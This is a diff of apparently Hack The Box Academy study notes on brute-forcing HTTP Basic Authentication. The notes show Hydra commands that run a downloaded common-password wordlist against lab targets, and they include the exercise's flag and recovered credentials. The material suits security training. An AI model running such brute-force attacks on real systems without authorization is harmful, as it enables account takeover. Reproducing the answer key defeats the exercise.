@@ -1,7 +1,7 @@
 # Basic HTTP Authentication
 In essence, Basic Auth is a challenge-response protocol where a web server demands user credentials before granting access to protected resources. The process begins when a user attempts to access a restricted area. The server responds with a `401 Unauthorized` status and a `WWW-Authenticate` header prompting the user's browser to present a login dialog.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
 # Hydra command
 masterofblafu@htb[/htb]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
@@ -18,7 +18,7 @@ Let's break down the command:
 ## Questions
 1. After successfully brute-forcing, and then logging into the target, what is the full flag you find? **Answer: HTB{th1s_1s_4_f4k3_fl4g}**
    - Run hydra using the `http-get` module → obtain valid credentials `basic-auth-user`:`Password@123`
-        ```sh
+        ```shellsession
         $ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 154.57.164.76 -s 31973 http-get /
         Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
